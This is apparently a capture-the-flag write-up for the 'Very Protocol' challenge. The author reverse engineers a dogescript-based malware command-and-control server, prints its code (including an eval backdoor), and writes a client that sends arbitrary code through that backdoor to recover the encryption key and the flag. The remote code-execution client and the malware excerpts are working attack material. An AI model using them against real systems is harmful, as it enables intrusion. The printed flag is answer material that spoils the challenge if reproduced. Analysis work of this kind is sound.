---
title: "Very Protocol"
date: 2021-02-04T19:50:40-06:00
tags: ["AdversaryQuest", "CTFs"]
---

#### Challenge Description:

> We were approached by a CATAPULT SPIDER victim that was compromised and had all their cat pictures encrypted. Employee morale dropped to an all-time low. We believe that we identified a binary file that is related to the incident and is still running in the customer environment, accepting command and control traffic on `veryprotocol.challenges.adversary.zone:41414`

> Can you help the customer recover the encryption key?

#### Write-up:

For this challenge we are given a (46MB!) binary and asked to reverse engineer the command and control protocol to recover the encryption key. Dealing with the size of the binary posed quite a challenge - when opening it in a reverse engineering program (I used Cutter) it caused the import to hang while analyzing. Even looking for strings gives hundreds of thousands of lines:

```
$ strings malware | wc
 422247  846037 16304682
```

So I kinda cheated. If we know the binary is listening on port 41414 for command and control traffic, let's search the malware for the string "41414". The port number could be specified as a binary integer or even be obfuscated of course, but we get lucky and find the code for a listening server in plaintext.  

```
$ grep -a 41414 malware                              
server.listen(41414, () => {
```

Let's take a look around a bit...

```
$ grep -a 41414 malware -A 10 -B 10
              socket.authorized ? 'top doge' : 'not top doge');
  let networker = new Networker(socket, (data) => {
    very doge_lingo is data dose toString
    shh plz console.loge with 'top doge sez:' doge_lingo
    very doge_woof is plz dogeParam with doge_lingo
    networker dose send with doge_woof
    //networker.send(dogeParam(data.toString()));
  });
  networker dose init with 'such doge is yes wow' 'such doge is shibe wow'
});
server.listen(41414, () => {
  plz console.loge with 'doge waiting for command from top doge'
});
server.on('connection', function(c) {
	plz console.loge with 'doge connect'
});
server.on('secureConnect', function(c) {
	plz console.loge with 'doge connect secure'
});
doge_cert = `-----BEGIN CERTIFICATE-----
MIIFITCCAwkCAWUwDQYJKoZIhvcNAQELBQAwTzELMAkGA1UEBhMCVVMxEzARBgNV
```

Looks like javascript... but written by a hekkin good boi

![doge programmer](images/shiba-programmer.jpg)

We were given a bit of a hint from the last challenge - this adversary forked the code for [dogescript](https://github.com/shibefan/dogescript) (very compile to javascript) and [DSON](https://github.com/shibefan/DSON) (much json reskin wow). Looks like they are writing meme malware. Let's grep around to find the beginning and end of the dogescript section and then covert it to javascript

```
$ grep -a "41414" malware -B 195 -A 589 > malware.djs
$ npm install -g dogescript
$ dogescript malware.djs --beautify > malware.js
```

Looking at the [code](malware.js.txt) we can see that it generates the secret key:

```Javascript
var cript_key = Math.random().toString(36).substr(2, 15);

if (process.env.CRYPTZ  === undefined) {
    console.log('no cryptz key. doge can not crypt catz.');
    process.exit(1);
}

var secrit_key = cript(process.env.CRYPTZ, cript_key);
process.env.CRYPTZ ='you dnt git key';
delete process.env.CRYPTZ;
```

The `cript(input, key)` function just xors the key with the environment variable `CRYPTZ`. Then we have a large function called `dogeParam` which takes in network data, parses it for DSON and depending on the DSON input, does something and returns DSON data to send back to the client. The key function I used here was 'do me a favor' which evaluates any dogescript you send to it. 

```Javascript
function dogeParam (buffer) { 
    var doge_command = dson.parse(buffer);
    var doge_response = {};

    if (!('dogesez' in doge_command)) {
        doge_response ['dogesez']='bonk';
        doge_response ['shibe']='doge not sez';
        return dson.stringify(doge_response);
    } 

    if (doge_command.dogesez  === 'ping') {
        doge_response ['dogesez']='pong';
        doge_response ['ohmaze']=doge_command.ohmaze;
    } 

    if (doge_command.dogesez  === 'do me a favor') {
        var favor = undefined;
        var doge = undefined;
        try {
            doge =dogescript(doge_command.ohmaze);
            favor =eval(doge);
            doge_response ['dogesez']='welcome';
            doge_response ['ohmaze']=favor;
        } catch {
            doge_response ['dogesez']='bonk';
            doge_response ['shibe']='doge sez no';
        }
    } 

 ...

    return dson.stringify(doge_response);
}
```

And finally there is some network code which starts a TLS server with certain certs and keys and passes data recieved to `dogeParam`.

```Javascript
const options ={ key: servs_key, cert: servs_cert, requestCert :true, rejectUnauthorized: true, ca: [ doge_ca ] };

const server = tls.createServer(options, (socket) => {
    console.log('doge connected: ', socket.authorized ? 'top doge' : 'not top doge');
    let networker = new Networker(socket, (data) => {
        var doge_lingo = data.toString();
        // plz console.loge with 'top doge sez:' doge_lingo
        var doge_woof = dogeParam(doge_lingo);
        networker.send(doge_woof);
        //networker.send(dogeParam(data.toString()));
    });
    
    networker.init('such doge is yes wow', 'such doge is shibe wow');
});
```

There is also a Networker class which is used on top of TLS and seems to add an extra layer of enryption, using the HMAC and AES  keys `'such doge is yes wow'` and `'such doge is shibe wow'` that it's initialized with. The easiest way to interface with this protocol is copy it and change it around to fit our needs. All we need to do is change the server certificate and key to the doge cert and key. Then connect to the server (instead of listen) and use the same Networker code to send and recieve data.

```Javascript
var conn = tls.connect(41414, "veryprotocol.challenges.adversary.zone", options, () => {
    let networker = new Networker(conn, (data) => {
        var doge_lingo = data.toString();
        console.log(dson.parse(doge_lingo).ohmaze)
    });
    networker.init('such doge is yes wow', 'such doge is shibe wow');
    tos = dson.stringify({dogesez: 'do me a favor', ohmaze:"cript(secrit_key,cript_key)"});
    console.log(tos);
    networker.send(tos);
});
```

We can put whatever `cmd` we want for the malware to run. [Here](doge-send.js.txt) is the full code. The xoring function `cript` is reversable and `secrit_key` and `cript_key` are defined globally so we can just ask the server to decrypt our key! 

```
$ npm install dogescript dogeon
$ node doge-send.js            
such "dogesez" is "do me a favor" next "ohmaze" is "cript(secrit_key,cript_key)" wow
CS{such_Pr0t0_is_n3tw0RkS_w0W}
```
